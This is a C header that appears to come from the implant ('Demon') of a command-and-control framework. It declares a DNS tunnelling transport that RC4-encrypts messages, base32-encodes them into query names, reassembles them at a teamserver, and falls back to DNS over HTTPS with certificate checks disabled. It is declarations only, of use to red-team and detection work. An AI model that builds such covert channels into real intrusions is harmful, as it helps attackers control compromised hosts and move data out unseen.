#ifndef DEMON_TRANSPORTDNS_H
#define DEMON_TRANSPORTDNS_H

#include <core/Package.h>
#include <core/Win32.h>

#ifdef TRANSPORT_DNS

/* The wininet header conflicts with the winhttp header that is already part
 * of the agent, so the few prototypes of the DNS over HTTPS fallback are
 * declared here. */
typedef HINTERNET ( WINAPI * DNS_FUNC_INTERNETOPENA )( LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags );
typedef HINTERNET ( WINAPI * DNS_FUNC_INTERNETCONNECTA )( HINTERNET hInternet, LPCSTR lpszServerName, WORD dwServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext );
typedef HINTERNET ( WINAPI * DNS_FUNC_HTTPOPENREQUESTA )( HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext );
typedef BOOL ( WINAPI * DNS_FUNC_HTTPSENDREQUESTA )( HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength );
typedef BOOL ( WINAPI * DNS_FUNC_INTERNETSETOPTIONA )( HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength );
typedef BOOL ( WINAPI * DNS_FUNC_INTERNETQUERYOPTIONA )( HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex );
typedef BOOL ( WINAPI * DNS_FUNC_HTTPQUERYINFOA )( HINTERNET hRequest, DWORD dwInfoType, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex );
typedef BOOL ( WINAPI * DNS_FUNC_INTERNETQUERYDATAAVAILABLE )( HINTERNET hRequest, LPDWORD lpdwBytesAvailable, LPDWORD lpdwNumberOfHandles, LPDWORD lpdwIndexes );
typedef BOOL ( WINAPI * DNS_FUNC_INTERNETCLOSEHANDLE )( HINTERNET hInternet );
typedef BOOL ( WINAPI * DNS_FUNC_INTERNETREADFILE )( HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead );

#ifndef INTERNET_OPEN_TYPE_PRECONFIG
#define INTERNET_OPEN_TYPE_PRECONFIG 0x00000001
#endif

#ifndef INTERNET_SERVICE_HTTP
#define INTERNET_SERVICE_HTTP 0x00000003
#endif

#ifndef INTERNET_FLAG_NO_CACHE_WRITE
#define INTERNET_FLAG_NO_CACHE_WRITE 0x04000000
#endif

#ifndef INTERNET_FLAG_KEEP_CONNECTION
#define INTERNET_FLAG_KEEP_CONNECTION 0x00400000
#endif

#ifndef INTERNET_FLAG_NO_UI
#define INTERNET_FLAG_NO_UI 0x02000000
#endif

#ifndef INTERNET_FLAG_NO_COOKIES
#define INTERNET_FLAG_NO_COOKIES 0x00002000
#endif

#ifndef INTERNET_FLAG_SECURE
#define INTERNET_FLAG_SECURE 0x00800000
#endif

#ifndef INTERNET_FLAG_RELOAD
#define INTERNET_FLAG_RELOAD 0x80000000
#endif

#ifndef INTERNET_FLAG_IGNORE_CERT_CN_INVALID
#define INTERNET_FLAG_IGNORE_CERT_CN_INVALID 0x00002000
#endif

#ifndef INTERNET_OPTION_SECURITY_FLAGS
#define INTERNET_OPTION_SECURITY_FLAGS 31
#endif

#ifndef SECURITY_FLAG_IGNORE_UNKNOWN_CA
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA 0x00000100
#endif

#ifndef HTTP_QUERY_STATUS_CODE
#define HTTP_QUERY_STATUS_CODE 2
#endif

/* Largest raw payload that is safe to return in a single UDP DNS answer. */
#define DNS_SAFE_CHUNK_SIZE 220

/* Sequence numbers are obfuscated with this mask before they are written
 * into the QNAME. The teamserver applies the same mask. */
#define DNS_SEQ_XOR_MASK 0x5A5A5A5A

/* Labels are limited to 63 bytes and a name to 253 bytes. */
#define DNS_LABEL_SIZE 63
#define DNS_MAX_NAME   253

/* The QNAME has to fit into a single DNS message. Every label costs one
 * additional byte in the wire format, so the text is kept below the limit. */
#define DNS_MAX_QNAME_TEXT 240

/* Largest raw message the teamserver reassembles. */
#define DNS_MAX_REQUEST_LENGTH 0x10000

/* The RC4 key is 16 bytes long. */
#define DNS_KEY_LENGTH 16

/* Fragment frame: [total][offset][chunk]. */
#define DNS_FRAME_HEADER 8

/* Seconds to wait for the answer of a single query. */
#define DNS_QUERY_TIMEOUT 2

/* Maximum number of resolvers that are tried in one round. */
#define DNS_MAX_RESOLVERS 8

/* Number of failures before a resolver is put on hold. */
#define DNS_MAX_FAIL_COUNT 3

/* Maximum number of fragments of a single upload or download. */
#define DNS_MAX_FRAGMENTS 512

/*!
 * Sends one transport message to the teamserver over DNS.
 *
 * The message is encrypted with RC4, encoded with base32 and carried in the
 * QNAME of a series of DNS queries. The teamserver reassembles the
 * fragments, processes the message and answers with a frame that carries the
 * response. On success and when Resp is not NULL, Resp->Buffer holds the
 * response (allocated with MmHeapAlloc) and Resp->Length its size.
 *
 * @param Send buffer to send
 * @param Resp optional response buffer
 * @return TRUE when the teamserver answered the message
 */
BOOL DnsSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
);

/*!
 * Builds a DNS query in the wire format.
 *
 * @param Qname the name that is queried
 * @param QtypeString the record type ("TXT", "A" or "AAAA")
 * @param OutBuffer buffer that receives the query
 * @param OutBufferSize size of the output buffer, at least 512 bytes
 * @param OutLength receives the length of the query
 * @return TRUE when the query was built
 */
BOOL BuildDnsWireQuery(
    _In_  PCHAR  Qname,
    _In_  PCHAR  QtypeString,
    _Out_ PBYTE  OutBuffer,
    _In_  ULONG  OutBufferSize,
    _Out_ PULONG OutLength
);

/*!
 * Parses a DNS response in the wire format.
 *
 * TXT records are concatenated, A records contribute four bytes and AAAA
 * records sixteen bytes.
 *
 * @param Response the raw response
 * @param ResponseLength length of the response
 * @param QtypeString the requested record type
 * @param OutBuffer buffer that receives the answer
 * @param OutBufferSize size of the output buffer
 * @param OutSize receives the size of the answer
 * @return TRUE when the response carried an answer
 */
BOOL ParseDnsWireResponse(
    _In_  PBYTE  Response,
    _In_  ULONG  ResponseLength,
    _In_  PCHAR  QtypeString,
    _Out_ PBYTE  OutBuffer,
    _In_  ULONG  OutBufferSize,
    _Out_ PULONG OutSize
);

/*!
 * Parses the acknowledgement of a PUT fragment.
 *
 * The layout is fixed by the protocol: [0] flags, [1:4] the next expected
 * offset as a 24 bit big endian value. The flag 0x01 marks a complete
 * message, 0x02 asks the agent to restart the upload.
 *
 * @param Response the raw answer
 * @param ResponseLength length of the answer
 * @param OutNextExpected receives the next expected offset
 * @param OutComplete receives the complete flag
 * @param OutNeedsReset receives the reset flag
 * @return TRUE when the acknowledgement was parsed
 */
BOOL ParsePutAckResponse(
    _In_  PBYTE  Response,
    _In_  ULONG  ResponseLength,
    _Out_ PULONG OutNextExpected,
    _Out_ BOOL*  OutComplete,
    _Out_ BOOL*  OutNeedsReset
);

/*!
 * Sends a single query to a plain DNS resolver.
 *
 * @param Qname the name that is queried
 * @param Resolver address of the resolver
 * @param QtypeString the record type
 * @param OutBuffer buffer that receives the answer
 * @param OutBufferSize size of the output buffer
 * @param OutSize receives the size of the answer
 * @return TRUE when the resolver answered
 */
BOOL QuerySingle(
    _In_  PCHAR  Qname,
    _In_  PCHAR  Resolver,
    _In_  PCHAR  QtypeString,
    _Out_ PBYTE  OutBuffer,
    _In_  ULONG  OutBufferSize,
    _Out_ PULONG OutSize
);

/*!
 * Sends a single query to a DNS over HTTPS resolver.
 *
 * @param Qname the name that is queried
 * @param ResolverUrl url of the resolver
 * @param QtypeString the record type
 * @param OutBuffer buffer that receives the answer
 * @param OutBufferSize size of the output buffer
 * @param OutSize receives the size of the answer
 * @return TRUE when the resolver answered
 */
BOOL QueryDoH(
    _In_  PCHAR  Qname,
    _In_  PCHAR  ResolverUrl,
    _In_  PCHAR  QtypeString,
    _Out_ PBYTE  OutBuffer,
    _In_  ULONG  OutBufferSize,
    _Out_ PULONG OutSize
);

/*!
 * Waits for the burst interval when burst mode is enabled.
 *
 * Burst mode ignores the regular sleep interval and polls the teamserver in
 * rapid succession.
 *
 * @return TRUE when the wait was handled and the regular sleep can be skipped
 */
BOOL DnsBurstWait(
    VOID
);

#endif

#endif
